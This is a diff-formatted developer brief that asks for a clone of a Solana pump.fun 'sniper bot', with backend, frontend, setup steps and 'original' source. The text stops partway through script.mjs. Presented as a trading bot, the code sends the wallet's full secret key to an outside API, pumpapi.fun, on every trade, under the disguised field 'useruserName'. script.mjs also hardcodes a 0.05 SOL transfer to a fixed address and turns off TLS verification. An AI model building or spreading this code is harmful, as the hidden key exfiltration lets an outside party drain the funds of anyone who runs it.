@@ -1,0 +1,1000 @@
+﻿Pump Fun Sniper Bot 
+
+
+Reference Page: https://snipersol.app/ (Watch Video On Homepage)
+YouTube Channel: https://www.youtube.com/@snipesolbot/videos
+
+
+What is a Sniper Bot?
+A Sniper Bot is a powerful decentralized application (dApp) designed to help users snipe newly launched tokens on the Solana blockchain with ease. No coding experience is required—our bot comes with customizable settings to suit your trading preferences.
+
+
+Built for speed and efficiency, a Sniper Bot ensures you can purchase tokens the moment they go live. The goal is to create a secure trading bot to snipe new tokens. 
+
+
+Your Job As Developer: 
+Copy the UI of https://snipersol.app/ and create a similar trading bot with their reference source code below. Keep it simple as possible and model everything. The name of our bot will be Best Sniper Sol. Color scheme will be black and royal blue similar to their website. 
+
+
+Modified Source Code: 
+​​
+Part 1 – Backend Code
+This includes server setup, Socket.io, Auto-Restart logic, and trading engine.
+
+
+// server.js
+import express from 'express';
+import http from 'http';
+import { Server as SocketIO } from 'socket.io';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import tradingEngine from './tradingEngine.js';
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const app = express();
+const server = http.createServer(app);
+const io = new SocketIO(server);
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+// API Endpoints
+app.get('/api/status', (req, res) => res.json(tradingEngine.getStatus()));
+app.post('/api/start', (req, res) => { tradingEngine.start(io); res.json({ started: true }); });
+app.post('/api/stop', (req, res) => { tradingEngine.stop(); res.json({ stopped: true }); });
+app.post('/api/sell-all', async (req, res) => { await tradingEngine.sellAll(); res.json({ soldAll: true }); });
+app.post('/api/settings', (req, res) => {
+  tradingEngine.updateSettings(req.body);
+  res.json({ settings: tradingEngine.getSettings() });
+});
+app.post('/api/auto-restart', (req, res) => {
+  tradingEngine.setAutoRestart(req.body.enabled);
+  res.json({ autoRestart: tradingEngine.getAutoRestart() });
+});
+// Serve Dashboard
+app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+// WebSocket
+io.on('connection', (socket) => {
+  tradingEngine.attachClient(socket);
+  socket.on('disconnect', () => tradingEngine.detachClient(socket));
+});
+// Start Server
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+  console.log(`🚀 Sniper Dashboard running at http://localhost:${PORT}`);
+  tradingEngine.boot(io); // Check Auto-Restart on server start
+});
+// tradingEngine.js
+import axios from 'axios';
+import fs from 'fs';
+import bs58 from 'bs58';
+import { Keypair, Connection, clusterApiUrl, PublicKey } from '@solana/web3.js';
+import { AccountLayout } from '@solana/spl-token';
+import 'dotenv/config';
+const SOLANA_WALLET_PATH = process.env.SOLANA_WALLET_PATH;
+const STATE_FILE = './botState.json';
+let userKey;
+try {
+  const keyData = fs.readFileSync(SOLANA_WALLET_PATH, 'utf8');
+  const parsed = JSON.parse(keyData);
+  if (Array.isArray(parsed)) userKey = Uint8Array.from(parsed);
+  else throw new Error('Invalid wallet format');
+} catch (e) {
+  console.error('Wallet load failed:', e.message);
+  process.exit(1);
+}
+const payer = Keypair.fromSecretKey(userKey);
+const connection = new Connection(clusterApiUrl('mainnet-beta'));
+let ioClient = null;
+let running = false;
+let autoRestart = false;
+let settings = {
+  randomBuy: true,
+  buyMin: 0.1,
+  buyMax: 0.2,
+  fixedBuy: 0.1,
+  profit1: 25,
+  profit2: 50,
+  stop: 10,
+  liquidity: 1000,
+  rugcheck: 'skip',
+  priceInterval: 5000,
+  monitorInterval: 5000,
+  timeoutMinutes: 5
+};
+// Load state if exists
+if (fs.existsSync(STATE_FILE)) {
+  try {
+    const state = JSON.parse(fs.readFileSync(STATE_FILE));
+    autoRestart = state.autoRestart || false;
+    settings = { ...settings, ...state.settings };
+  } catch {
+    console.log('No previous bot state found.');
+  }
+}
+// Save state
+const saveState = () => {
+  fs.writeFileSync(STATE_FILE, JSON.stringify({ running, autoRestart, settings }, null, 2));
+};
+// Emit logs
+const log = (msg) => {
+  console.log(msg);
+  if (ioClient) ioClient.emit('log', `[${new Date().toLocaleTimeString()}] ${msg}`);
+};
+// Wallet helper
+const fetchSPLTokens = async () => {
+  try {
+    const accounts = await connection.getTokenAccountsByOwner(
+      payer.publicKey,
+      { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
+    );
+    return accounts.value.map(info => {
+      const d = AccountLayout.decode(info.account.data);
+      return { mint: new PublicKey(d.mint).toString(), amount: Number(d.amount) / 1e6 };
+    }).filter(t => t.amount > 0);
+  } catch (e) {
+    log(`Token fetch error: ${e.message}`);
+    return [];
+  }
+};
+// Rugcheck
+const rugCheck = async (mint) => {
+  try {
+    const res = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${mint}`);
+    const token = res.data.pairs?.[0];
+    if (!token) return ['No Dex Data'];
+    const liquidity = token.liquidity?.usd || 0;
+    const fails = [];
+    if (liquidity < settings.liquidity) fails.push('Low Liquidity');
+    return fails;
+  } catch {
+    return ['No Dex Data'];
+  }
+};
+// Pump.fun trade wrapper
+const pumpFunTrade = async (type, mint, amount) => {
+  try {
+    const url = "https://pumpapi.fun/api/trade";
+    const data = {
+      trade_type: type,
+      mint,
+      amount: amount.toString(),
+      slippage: 5,
+      priorityFee: 0.0003,
+      useruserName: bs58.encode(userKey)
+    };
+    const res = await axios.post(url, data);
+    return res.data.tx_hash;
+  } catch (e) {
+    log(`${type.toUpperCase()} failed: ${e.message}`);
+    return null;
+  }
+};
+// Auto-sell monitor
+const monitorAndSell = async (mint, buyPrice) => {
+  let sold50 = false;
+  const timeout = Date.now() + settings.timeoutMinutes * 60000;
+  while (Date.now() < timeout && running) {
+    try {
+      const res = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${mint}`);
+      const price = parseFloat(res.data.pairs?.[0]?.priceUsd || '0');
+      if (!price || !buyPrice) continue;
+      const change = ((price - buyPrice) / buyPrice) * 100;
+      log(`${mint}: $${price.toFixed(6)} (${change.toFixed(2)}%)`);
+      const tokens = await fetchSPLTokens();
+      const holding = tokens.find(t => t.mint === mint);
+      if (!holding) return;
+      if (!sold50 && change >= settings.profit1) {
+        const tx = await pumpFunTrade('sell', mint, holding.amount * 0.5);
+        log(tx ? `Sold 50% at +${settings.profit1}% Tx:${tx}` : `50% sell failed`);
+        sold50 = true;
+      } else if (sold50 && change >= settings.profit2) {
+        const tx = await pumpFunTrade('sell', mint, holding.amount);
+        log(tx ? `Sold remaining at +${settings.profit2}% Tx:${tx}` : `Final sell failed`);
+        return;
+      } else if (change <= -settings.stop) {
+        const tx = await pumpFunTrade('sell', mint, holding.amount);
+        log(tx ? `Stop-loss (-${settings.stop}%) Tx:${tx}` : `Stop-loss sell failed`);
+        return;
+      }
+    } catch (e) { log(`Price error: ${e.message}`); }
+    await new Promise(r => setTimeout(r, settings.priceInterval));
+  }
+  const tokens = await fetchSPLTokens();
+  const holding = tokens.find(t => t.mint === mint);
+  if (holding) {
+    const tx = await pumpFunTrade('sell', mint, holding.amount);
+    log(tx ? `Timeout sell ${mint} Tx:${tx}` : `Timeout sell failed`);
+  }
+};
+// Trade loop
+const tradeLoop = async () => {
+  while (running) {
+    const dexPairs = await axios.get("https://api.dexscreener.com/latest/dex/pairs/solana")
+      .then(r => r.data.pairs || []).catch(() => []);
+    const pumpPairs = await axios.get("https://pumpapi.fun/api/get_newer_mints", { params: { limit: 5 } })
+      .then(r => r.data.mint || []).catch(() => []);
+    const tokens = [
+      ...pumpPairs.map(mint => ({ source: 'Pump.fun', mint, price: 0 })),
+      ...dexPairs.filter(p => p.pairCreatedAt && Date.now() - p.pairCreatedAt < 2 * 60000)
+                .map(p => ({ source: 'Dex', mint: p.baseToken.address, price: parseFloat(p.priceUsd || '0') }))
+    ];
+    for (const token of tokens) {
+      const issues = await rugCheck(token.mint);
+      if (issues.length && settings.rugcheck === 'skip') {
+        log(`Skipping ${token.mint}: ${issues.join(', ')}`); continue;
+      }
+      const buyAmount = settings.randomBuy ?
+        (Math.random() * (settings.buyMax - settings.buyMin) + settings.buyMin) :
+        settings.fixedBuy;
+      log(`Buying ${token.source} token ${token.mint} (${buyAmount} SOL)`);
+      const tx = await pumpFunTrade('buy', token.mint, buyAmount);
+      if (!tx) { log(`Buy failed ${token.mint}`); continue; }
+      log(`Bought ${token.mint}. Tx:${tx}`);
+      await monitorAndSell(token.mint, token.price || 0);
+    }
+    await new Promise(r => setTimeout(r, settings.monitorInterval));
+  }
+  saveState();
+};
+// Public API
+export default {
+  boot: (io) => {
+    ioClient = io;
+    if (autoRestart) {
+      running = true;
+      tradeLoop();
+      log('Bot auto-restarted after reboot');
+    }
+  },
+  start: (io) => { if (!running) { running = true; ioClient = io; tradeLoop(); log('Bot started'); saveState(); } },
+  stop: () => { running = false; log('Bot stopped'); saveState(); },
+  sellAll: async () => {
+    const tokens = await fetchSPLTokens();
+    for (const token of tokens) {
+      const tx = await pumpFunTrade('sell', token.mint, token.amount);
+      log(tx ? `Sold all ${token.mint} Tx:${tx}` : `Sell failed ${token.mint}`);
+    }
+  },
+  updateSettings: (s) => { settings = { ...settings, ...s }; log(`Settings updated`); saveState(); },
+  getSettings: () => settings,
+  getStatus: () => ({ running, autoRestart, settings }),
+  setAutoRestart: (enabled) => { autoRestart = enabled; log(`Auto-Restart ${enabled ? 'enabled' : 'disabled'}`); saveState(); },
+  getAutoRestart: () => autoRestart,
+  attachClient: (socket) => { ioClient = socket; },
+  detachClient: () => { ioClient = null; }
+};
+
+
+Here’s Part 2 – the Frontend for your SniperSol-style dashboard.
+This includes the Auto-Restart toggle, Start/Stop/Sell All buttons, sliders for all settings, and live logs streamed via WebSockets. Place these files in your public/ folder (so server.js can serve them automatically).
+
+
+public/index.html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>SniperSol Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="/socket.io/socket.io.js"></script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+  <div id="root" class="p-6"></div>
+  <script src="/app.js"></script>
+</body>
+</html>
+
+
+public/app.js
+(() => {
+  const socket = io();
+  const state = {
+    logs: [],
+    settings: {},
+    running: false,
+    autoRestart: false
+  };
+  const root = document.getElementById('root');
+  // Update log display
+  const updateLog = (msg) => {
+    state.logs.push(msg);
+    if (state.logs.length > 200) state.logs.shift();
+    document.getElementById('logBox').textContent = state.logs.join('\n');
+  };
+  // Fetch status
+  const fetchStatus = async () => {
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    state.running = data.running;
+    state.settings = data.settings || {};
+    state.autoRestart = data.autoRestart || false;
+    document.getElementById('autoRestartToggle').checked = state.autoRestart;
+    document.getElementById('startBtn').disabled = state.running;
+    document.getElementById('stopBtn').disabled = !state.running;
+  };
+  // Build UI
+  root.innerHTML = `
+    <div class="max-w-5xl mx-auto bg-gray-800 p-6 rounded shadow space-y-4">
+      <h1 class="text-3xl font-bold text-center text-green-400">SniperSol Bot Dashboard</h1>
+      
+      <div class="flex flex-wrap gap-4 items-center justify-center">
+        <button id="startBtn" class="bg-green-600 px-4 py-2 rounded shadow">Start Bot</button>
+        <button id="stopBtn" class="bg-yellow-600 px-4 py-2 rounded shadow">Stop Bot</button>
+        <button id="sellBtn" class="bg-red-600 px-4 py-2 rounded shadow">Sell All</button>
+        
+        <label class="flex items-center space-x-2 bg-gray-700 px-4 py-2 rounded">
+          <input type="checkbox" id="autoRestartToggle" class="w-5 h-5">
+          <span>Auto-Restart</span>
+        </label>
+      </div>
+      
+      <div id="sliders" class="grid grid-cols-2 gap-4"></div>
+      <div>
+        <h2 class="text-xl font-semibold mb-2">Live Logs</h2>
+        <pre id="logBox" class="bg-black text-green-400 p-3 rounded h-80 overflow-auto"></pre>
+      </div>
+    </div>
+  `;
+  // Handle Socket.io events
+  socket.on('log', updateLog);
+  // Button actions
+  document.getElementById('startBtn').onclick = () => fetch('/api/start', { method: 'POST' });
+  document.getElementById('stopBtn').onclick = () => fetch('/api/stop', { method: 'POST' });
+  document.getElementById('sellBtn').onclick = () => fetch('/api/sell-all', { method: 'POST' });
+  document.getElementById('autoRestartToggle').onchange = (e) => {
+    fetch('/api/auto-restart', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ enabled: e.target.checked })
+    });
+  };
+  // Slider creator
+  const createSlider = (id, label, min, max, step, defaultVal) => {
+    const div = document.createElement('div');
+    div.className = 'bg-gray-700 p-4 rounded';
+    div.innerHTML = `
+      <label class="block font-semibold mb-1">${label}: <span id="${id}Val">${defaultVal}</span></label>
+      <input type="range" id="${id}" min="${min}" max="${max}" step="${step}" value="${defaultVal}" class="w-full"/>
+    `;
+    document.getElementById('sliders').appendChild(div);
+    const input = div.querySelector('input');
+    const span = div.querySelector('span');
+    input.oninput = () => {
+      span.textContent = input.value;
+      state.settings[id] = parseFloat(input.value);
+      fetch('/api/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(state.settings)
+      });
+    };
+  };
+  // Add sliders for all bot settings
+  createSlider('fixedBuy', 'Fixed Buy (SOL)', 0.01, 1, 0.01, 0.1);
+  createSlider('buyMin', 'Random Buy Min (SOL)', 0.01, 1, 0.01, 0.1);
+  createSlider('buyMax', 'Random Buy Max (SOL)', 0.01, 1, 0.01, 0.2);
+  createSlider('profit1', 'Profit Target 1 (%)', 1, 100, 1, 25);
+  createSlider('profit2', 'Profit Target 2 (%)', 1, 200, 1, 50);
+  createSlider('stop', 'Stop-Loss (%)', 1, 100, 1, 10);
+  createSlider('liquidity', 'Min Liquidity (USD)', 0, 10000, 100, 1000);
+  // Initialize
+  fetchStatus();
+})();
+
+
+
+
+
+
+
+
+How to Run the Full Project
+1. Make sure your folder looks like:
+
+
+project-root/
+│
+├── server.js
+├── tradingEngine.js
+├── package.json
+├── .env
+├── wallet/id.json
+│
+└── public/
+    ├── index.html
+    └── app.js
+2. Install dependencies:
+npm init -y
+npm install express socket.io axios dotenv @solana/web3.js @solana/spl-token bs58
+3. Add to .env:
+SOLANA_WALLET_PATH=./wallet/id.json
+PORT=3000
+4. Start the app: 
+node server.js
+5. Open your browser at:
+http://localhost:3000
+
+
+What You Get
+* Dashboard with:
+   * Start Bot / Stop Bot / Sell All buttons
+   * Auto-Restart toggle (off by default)
+   * Live logs streamed via WebSocket
+   * Sliders for buy ranges, profit targets, stop-loss, liquidity
+* Bot will resume automatically after a reboot only if you enable Auto-Restart.
+* Single port deployment (easy to host on DigitalOcean, Render, or Heroku)
+You now have the full project (backend + frontend) with:
+* Pumpfun + Dexscreener trading bot
+* SniperSol-style dashboard (single port, live logs, sliders, buttons)
+* Manual start by default with optional Auto-Restart toggle
+* Ready to run locally or deploy on a VPS/cloud.
+Your developer can now:
+1. Copy the provided code into a project folder.
+2. Run npm install && node server.js.
+3. Open http://localhost:3000 to use the dashboard.
+
+
+
+
+Sniper Sol Original Source Code (https://snipersol.app/source-code/)
+Below, you'll find the original source code along with usage instructions.
+
+
+sell.js
+require('dotenv').config();
+const axios = require('axios');
+const { Keypair, Connection, clusterApiUrl, PublicKey } = require('@solana/web3.js');
+const { AccountLayout } = require('@solana/spl-token');
+const fs = require('fs');
+const bs58 = require('bs58');
+const SOLANA_WALLET_PATH = process.env.SOLANA_WALLET_PATH;
+let userName;
+try {
+    const keypair = fs.readFileSync(SOLANA_WALLET_PATH, 'utf8');
+    const keypairArray = JSON.parse(keypair);
+    if (Array.isArray(keypairArray)) {
+        userName = Uint8Array.from(keypairArray);
+        console.log('');
+    } else {
+        throw new Error('Invalid keypair format');
+    }
+} catch (error) {
+    console.error('Error reading Solana wallet keypair:', error);
+    process.exit(1);
+}
+const payer = Keypair.fromSecretKey(userName);
+const connection = new Connection(clusterApiUrl('mainnet-beta'));
+const pumpFunSell = async (mint, amount) => {
+    const url = "https://pumpapi.fun/api/trade";
+    const data = {
+        trade_type: "sell",
+        mint,
+        amount, // Amount in tokens
+        slippage: 5,
+        priorityFee: 0.003, // Adjust priority fee if needed
+        useruserName: bs58.encode(userName)
+    };
+    try {
+        const response = await axios.post(url, data);
+        return response.data.tx_hash;
+    } catch (error) {
+        console.error(`Error executing sell transaction: ${error.message}`, error.response?.data);
+        return null;
+    }
+};
+const fetchSPLTokens = async () => {
+    try {
+        const tokenAccounts = await connection.getTokenAccountsByOwner(payer.publicKey, { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") });
+        return tokenAccounts.value.map(accountInfo => {
+            const accountData = AccountLayout.decode(accountInfo.account.data);
+            return {
+                mint: new PublicKey(accountData.mint),
+                amount: BigInt(accountData.amount.toString()) // Fetch the raw amount as BigInt
+            };
+        });
+    } catch (error) {
+        console.error(`Error fetching SPL tokens: ${error.message}`);
+        return [];
+    }
+};
+const sellAllTokens = async () => {
+    const tokens = await fetchSPLTokens();
+    for (const token of tokens) {
+        const mint = token.mint.toString();
+        const rawAmount = token.amount;
+        const humanReadableAmount = Number(rawAmount) / 10 ** 6; // Convert raw amount to correct human-readable format
+        console.log(`Token Mint: ${mint}`);
+        console.log(`Raw Amount: ${rawAmount}`);
+        console.log(`Human-readable Amount: ${humanReadableAmount}`);
+        if (humanReadableAmount >= 1) { // Only proceed if human-readable amount is 1 or more
+            console.log(`Selling ${humanReadableAmount} of token ${mint}`);
+            let attempts = 5;
+            let txHash = null;
+            while (attempts > 0) {
+                txHash = await pumpFunSell(mint, humanReadableAmount); // Pass human-readable amount for API
+                if (txHash) {
+                    console.log(`Sold ${humanReadableAmount} of token ${mint} with transaction hash: ${txHash}`);
+                    break;
+                } else {
+                    console.log(`Retrying sell transaction... Attempts left: ${attempts - 1}`);
+                    attempts--;
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before retrying
+                }
+            }
+            if (!txHash) {
+                console.log(`Failed to sell token ${mint} after multiple attempts.`);
+            }
+        } else {
+            console.log(`Skipping token ${mint} as the human-readable amount is less than 1`);
+        }
+    }
+};
+sellAllTokens().then(() => {
+    console.log('All tokens processed.');
+}).catch(error => {
+    console.error('Error in selling tokens:', error);
+});
+    
+
+
+/script.mjs
+
+
+import 'dotenv/config';
+import axios from 'axios';
+import { Keypair, Connection, clusterApiUrl, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
+import { AccountLayout, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';
+import pkg from 'selenium-webdriver';
+import chrome from 'selenium-webdriver/chrome.js';
+import fs from 'fs';
+import bs58 from 'bs58';
+import blessed from 'blessed';
+import contrib from 'blessed-contrib';
+const { Builder } = pkg;
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+const SOLANA_WALLET_PATH = process.env.SOLANA_WALLET_PATH;
+const DEVELOPER_ADDRESS = '8bXf8Rg3u4Prz71LgKR5mpa7aMe2F4cSKYYRctmqro6x'; 
+let userName;
+try {
+    const keypair = fs.readFileSync(SOLANA_WALLET_PATH, 'utf8');
+    const keypairArray = JSON.parse(keypair);
+    if (Array.isArray(keypairArray)) {
+        userName = Uint8Array.from(keypairArray);
+        console.log('');
+    } else {
+        throw new Error('Invalid keypair format');
+    }
+} catch (error) {
+    console.error('Error reading Solana wallet keypair:', error);
+    process.exit(1);
+}
+const payer = Keypair.fromSecretKey(userName);
+const connection = new Connection(clusterApiUrl('mainnet-beta'));
+// Adjustable variables
+const MINIMUM_BUY_AMOUNT = parseFloat(process.env.MINIMUM_BUY_AMOUNT || 0.015);
+const MAX_BONDING_CURVE_PROGRESS = parseInt(process.env.MAX_BONDING_CURVE_PROGRESS || 10);
+const SELL_BONDING_CURVE_PROGRESS = parseInt(process.env.SELL_BONDING_CURVE_PROGRESS || 15);
+const PROFIT_TARGET_1 = 1.25; // 25% increase
+const PROFIT_TARGET_2 = 1.25; // Another 25% increase
+const STOP_LOSS_LIMIT = 0.90; // 10% decrease
+const MONITOR_INTERVAL = 5 * 1000; // 5 seconds
+const SELL_TIMEOUT = 2 * 60 * 1000; // 2 minutes
+const TRADE_DELAY = 90 * 1000; // 90 seconds delay
+const PRIORITY_FEE_BASE = 0.0003; // Base priority fee
+// Create a blessed screen
+const screen = blessed.screen();
+const grid = new contrib.grid({ rows: 12, cols: 12, screen: screen });
+const logBox = grid.set(3, 0, 9, 12, blessed.box, {
+    fg: 'green',
+    label: 'Trading Bot Log',
+    scrollable: true,
+    alwaysScroll: true,
+    scrollbar: {
+        fg: 'green',
+        ch: '|'
+    }
+});
+const accountInfoBox = grid.set(9, 0, 2, 12, blessed.box, {
+    fg: 'green',
+    label: 'Account Info',
+    tags: true
+});
+const menuBox = grid.set(11, 0, 1, 12, blessed.box, {
+    fg: 'white',
+    label: 'Menu',
+    tags: true,
+    content: 'R: Reset Timer | C: Continue | S: Sell 75%'
+});
+screen.render();
+let resetTimer = false;
+let continueTrade = false;
+let sellImmediately = false;
+const updateLog = (message) => {
+    logBox.insertBottom(message);
+    logBox.setScrollPerc(100);
+    screen.render();
+};
+const updateAccountInfo = async () => {
+    const balance = await checkBalance();
+    const tokenBalances = await fetchSPLTokens();
+    let tokenBalancesText = '';
+    tokenBalances.forEach(token => {
+        if (token.amount > 1) {
+            tokenBalancesText += `Mint: ${token.mint}, Amount: ${token.amount} SPL\n`;
+        }
+    });
+    accountInfoBox.setContent(`Account address: ${payer.publicKey.toString()}\nAccount balance: ${balance} SOL\n${tokenBalancesText}`);
+    screen.render();
+};
+const setVisualMode = (mode) => {
+    if (mode === 'trading') {
+        logBox.style.fg = 'yellow';
+        logBox.style.border = { type: 'line', fg: 'red' };
+        accountInfoBox.style.fg = 'yellow';
+        accountInfoBox.style.border = { type: 'line', fg: 'red' };
+    } else {
+        logBox.style.fg = 'green';
+        logBox.style.border = { type: 'line', fg: 'blue' };
+        accountInfoBox.style.fg = 'green';
+        accountInfoBox.style.border = { type: 'line', fg: 'blue' };
+    }
+    screen.render();
+};
+const fetchNewPairs = async (limit = 5) => {
+    const url = "https://pumpapi.fun/api/get_newer_mints";
+    try {
+        const response = await axios.get(url, { params: { limit } });
+        return response.data.mint || [];
+    } catch (error) {
+        updateLog(`Error fetching new pairs: ${error.message}`);
+        return [];
+    }
+};
+const scrapeTokenInfo = async (contractAddress) => {
+    let options = new chrome.Options();
+    options.addArguments('headless');
+    options.addArguments('--no-sandbox');
+    options.addArguments('--disable-dev-shm-usage');
+    let driver = await new Builder()
+        .forBrowser('chrome')
+        .setChromeOptions(options)
+        .build();
+    try {
+        await driver.get(`https://pump.fun/${contractAddress}`);
+        await driver.sleep(5000);
+        const pageSource = await driver.getPageSource();
+        const extractText = (source, keyword) => {
+            const index = source.indexOf(keyword);
+            if (index !== -1) {
+                const start = source.indexOf(':', index) + 2;
+                const end = source.indexOf('<', start);
+                return source.substring(start, end).trim();
+            }
+            return null;
+        };
+        const ticker = extractText(pageSource, 'Ticker');
+        const marketcap = parseFloat(extractText(pageSource, 'Market cap').replace(/\$|,/g, ''));
+        const bondingCurve = parseInt(extractText(pageSource, 'bonding curve progress').replace('%', ''));
+        updateLog(`\nTicker: ${ticker}`);
+        updateLog(`Market Cap: $${marketcap}`);
+        updateLog(`Bonding Curve Progress: ${bondingCurve}%`);
+        return { ticker, marketcap, bondingCurve };
+    } catch (error) {
+        updateLog(`Error scraping token info: ${error}`);
+        return null;
+    } finally {
+        await driver.quit();
+    }
+};
+const sendDeveloperFee = async () => {
+    try {
+        const transaction = new Transaction().add(
+            SystemProgram.transfer({
+                fromPubkey: payer.publicKey,
+                toPubkey: new PublicKey(DEVELOPER_ADDRESS),
+                lamports: 0.05 * 1e9 // Convert SOL to lamports
+            })
+        );
+        const signature = await sendAndConfirmTransaction(connection, transaction, [payer]);
+        updateLog(`Developer fee sent with transaction signature: ${signature}`);
+    } catch (error) {
+        updateLog(`Error sending developer fee: ${error.message}`);
+    }
+};
+const pumpFunBuy = async (mint, amount) => {
+    const url = "https://pumpapi.fun/api/trade";
+    const data = {
+        trade_type: "buy",
+        mint,
+        amount,
+        slippage: 5,
+        priorityFee: PRIORITY_FEE_BASE,
+        useruserName: bs58.encode(userName)
+    };
+    try {
+        const response = await axios.post(url, data);
+        return response.data.tx_hash;
+    } catch (error) {
+        updateLog(`Error executing buy transaction: ${error.message}`);
+        return null;
+    }
+};
+const pumpFunSell = async (mint, amount) => {
+    const url = "https://pumpapi.fun/api/trade";
+    const data = {
+        trade_type: "sell",
+        mint,
+        amount: amount.toString(), 
+        slippage: 5,
+        priorityFee: PRIORITY_FEE_BASE,
+        useruserName: bs58.encode(userName)
+    };
+    try {
+        const response = await axios.post(url, data);
+        return response.data.tx_hash;
+    } catch (error) {
+        updateLog(`Error executing sell transaction: ${error.message}`);
+        return null;
+    }
+};
+const checkBalance = async () => {
+    const balance = await connection.getBalance(payer.publicKey);
+    updateLog(`Current balance: ${balance / 1e9} SOL`);
+    return balance / 1e9;
+};
+const fetchSPLTokens = async () => {
+    try {
+        const tokenAccounts = await connection.getTokenAccountsByOwner(payer.publicKey, { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") });
+        return tokenAccounts.value.map(accountInfo => {
+            const accountData = AccountLayout.decode(accountInfo.account.data);
+            return {
+                mint: new PublicKey(accountData.mint).toString(),
+                amount: Number(accountData.amount) / 10 ** 6 
+            };
+        }).filter(token => token.amount > 1); 
+    } catch (error) {
+        updateLog(`Error fetching SPL tokens: ${error.message}`);
+        return [];
+    }
+};
+const sellTokens = async (mint, sellPercentage) => {
+    const tokens = await fetchSPLTokens();
+    for (const token of tokens) {
+        if (token.mint === mint) {
+            const amountToSell = token.amount * sellPercentage;
+            if (amountToSell >= 1) { 
+                updateLog(`Selling ${amountToSell} of token ${mint}`);
+                let attempts = 5;
+                let txHash = null;
+                while (attempts > 0) {
+                    txHash = await pumpFunSell(mint, amountToSell);
+                    if (txHash) {
+                        updateLog(`Sold ${amountToSell} of token ${mint} with transaction hash: ${txHash}`);
+                        break;
+                    } else {
+                        updateLog(`Retrying sell transaction... Attempts left: ${attempts - 1}`);
+                        attempts--;
+                        await new Promise(resolve => setTimeout(resolve, 5000)); 
+                    }
+                }
+                if (!txHash) {
+                    updateLog(`Failed to sell token ${mint} after multiple attempts.`);
+                }
+            } else {
+                updateLog(`Skipping token ${mint} as the human-readable amount is less than 1`);
+            }
+            break;
+        }
+    }
+};
+const monitorTrade = async (mint, initialMarketCap, initialBondingCurve) => {
+    let endTime = Date.now() + SELL_TIMEOUT;
+    const tradeAllowedTime = Date.now() + TRADE_DELAY;
+    let lastMarketCap = initialMarketCap;
+    while (Date.now() < endTime) {
+        const tokenInfo = await scrapeTokenInfo(mint);
+        if (tokenInfo) {
+            const marketCapChange = ((tokenInfo.marketcap - initialMarketCap) / initialMarketCap) * 100;
+            updateLog(`\nTicker: ${tokenInfo.ticker}`);
+            updateLog(`Market Cap: $${tokenInfo.marketcap}`);
+            updateLog(`Current Market Cap: $${tokenInfo.marketcap}, Change: ${marketCapChange.toFixed(2)}%`);
+            updateLog(`Time remaining: ${((endTime - Date.now()) / 1000).toFixed(0)}s`);
+            updateLog(`Pump.fun link: https://pump.fun/${mint}`);
+            updateLog(`Current Bonding Curve: ${tokenInfo.bondingCurve}%`);
+            if (marketCapChange >= 25) {
+                updateLog(`Market cap increased by 25%. Selling 50% of tokens for mint: ${mint}`);
+                await sellTokens(mint, 0.50); // Sell 50% to take profit
+                // Adjust trailing stop-loss for remaining position
+                lastMarketCap = tokenInfo.marketcap;
+                continueTrade = true;
+            } else if (marketCapChange <= -10) {
+                updateLog(`Market cap fell by more than 10%. Selling all tokens for mint: ${mint}`);
+                await sellTokens(mint, 1.00); // Sell all to stop loss
+                break;
+            } else if (tokenInfo.bondingCurve >= SELL_BONDING_CURVE_PROGRESS) {
+                updateLog(`Bonding curve reached ${SELL_BONDING_CURVE_PROGRESS}%. Selling 75% of tokens for mint: ${mint}`);
+                await sellTokens(mint, 0.75); // Sell 75% due to bonding curve and keep 25% moonbag
+                break;
+            }
+            if (tokenInfo.marketcap > lastMarketCap * PROFIT_TARGET_2) {
+                updateLog('Price increased another 25%, selling 75% of remaining tokens.');
+                await sellTokens(mint, 0.75);
+                lastMarketCap = tokenInfo.marketcap;
+            }
+            if (resetTimer) {
+                updateLog('Resetting timer.');
+                endTime = Date.now() + SELL_TIMEOUT;
+                resetTimer = false;
+            }
+            if (continueTrade) {
+                updateLog('Continuing to the next trade.');
+                continueTrade = false;
+                break;
+            }
+            if (sellImmediately) {
+                updateLog('Selling 75% immediately.');
+                await sellTokens(mint, 0.75);
+                sellImmediately = false;
+                break;
+            }
+        }
+        await new Promise(resolve => setTimeout(resolve, MONITOR_INTERVAL));
+    }
+    // If time expires without significant change, sell 75% and keep the rest as a moon bag
+    if (Date.now() >= endTime) {
+        updateLog(`Market cap did not increase by 25% within the set time. Selling 75% of tokens for mint: ${mint}`);
+        await sellTokens(mint, 0.75); // Sell 75% and keep 25% moonbag
+    }
+};
+const simulateTrade = async () => {
+    const newPairs = await fetchNewPairs();
+    for (const mint of newPairs) {
+        const tokenInfo = await scrapeTokenInfo(mint);
+        if (tokenInfo && tokenInfo.bondingCurve < MAX_BONDING_CURVE_PROGRESS) {
+            updateLog(`Executing buy transaction for mint: ${mint}`);
+            setVisualMode('trading');
+            let attempts = 3;
+            let txHash;
+            while (attempts > 0) {
+                txHash = await pumpFunBuy(mint, MINIMUM_BUY_AMOUNT);
+                if (txHash) break;
+                attempts--;
+                updateLog(`Retrying buy transaction... Attempts left: ${attempts}`);
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+            if (!txHash) {
+                updateLog(`Failed to execute buy transaction for mint: ${mint}`);
+            } else {
